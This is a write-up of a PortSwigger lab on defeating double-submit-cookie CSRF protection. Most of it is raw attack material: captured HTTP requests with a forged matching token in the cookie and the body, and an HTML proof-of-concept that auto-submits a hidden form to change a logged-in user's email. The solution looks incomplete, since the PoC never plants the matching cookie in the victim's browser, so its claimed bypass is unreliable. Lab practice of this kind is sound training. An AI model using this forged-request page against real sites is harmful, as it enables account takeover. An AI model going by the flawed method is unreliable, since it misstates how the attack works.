## Lab Description :

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/5e3c5679-cfe8-4604-88d1-27aff3ccef53)


## Overview :

Sites also commonly use a **double-submit cookie as a defense against CSRF**. In this technique, the state-changing request contains the same random token as both a cookie and a request parameter, and  the server checks whether the two values are equal. If the values match, the request is seen as legitimate. Otherwise, the application rejects.

If the application uses double-submit cookies as its CSRF defense mechanism, it’s probably not keeping records of the valid token server-side. If the server were keeping records of the CSRF token server-side, it could simply validate the token when it was sent over, and the application would not need  to use double-submit cookies in the first place. 

The **server has no way of knowing if any token it receives is actually legitimate; it’s merely checking that the token in the cookie and the token in the request body is the same**. 

_Bypass this restriction by providing same non legitimate token in both request & body -_

```http
POST /password_change
Host: email.example.com
Cookie: session_cookie=YOUR_SESSION_COOKIE; csrf_token=not_a_real_token
(POST request body)
new_password=abc123&csrf_token=not_a_real_token
```


## Solution :

When we login as wiener using the credentials `wiener:peter` , we can see that there is an option to update email.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/81496866-9b48-4acd-b45e-cdf53f282194)


When we click _update email_ , browser sends a POST request to `/my-account/change-email` endpoint.

```http
POST /my-account/change-email HTTP/1.1
Host: 0a5200eb035a4bf3809f127f001f008b.web-security-academy.net
Cookie: session=1TDOBkXU3oUy8w85YeFN3gToHBVAdw5q; csrf=OCdA7UvClyR6Aw4aRGYUKWKZWRYhB3Q8
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 59
Origin: https://0a5200eb035a4bf3809f127f001f008b.web-security-academy.net
Referer: https://0a5200eb035a4bf3809f127f001f008b.web-security-academy.net/my-account?id=wiener
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

email=user%40user.net&csrf=OCdA7UvClyR6Aw4aRGYUKWKZWRYhB3Q8
```
We can see that there is a **double submit of csrf token** in the cookie and request parameter. 

**This means that the server is not storing csrf tokens on server side instead it is just comparing whether both the tokens are same . If yes then it accepts the request else it rejects.**

So to bypass this , we can give any random token of the same length (the server might be checking the length of the token also) both in cookie and in request parameter.

> Also change the email to any other email which is not used.

```http
POST /my-account/change-email HTTP/1.1
Host: 0a5200eb035a4bf3809f127f001f008b.web-security-academy.net
Cookie: session=1TDOBkXU3oUy8w85YeFN3gToHBVAdw5q; csrf=AFA3EGFGU6OAw4AGFFSB784JHFKFFAFG
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 59
Origin: https://0a5200eb035a4bf3809f127f001f008b.web-security-academy.net
Referer: https://0a5200eb035a4bf3809f127f001f008b.web-security-academy.net/my-account?id=wiener
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

email=pwned%40user.net&csrf=AFA3EGFGU6OAw4AGFFSB784JHFKFFAFG
```
Now generate a POC.


```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://0a5200eb035a4bf3809f127f001f008b.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="pwned&#64;user&#46;net" />
      <input type="hidden" name="csrf" value="AFA3EGFGU6OAw4AGFFSB784JHFKFFAFG" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>

```






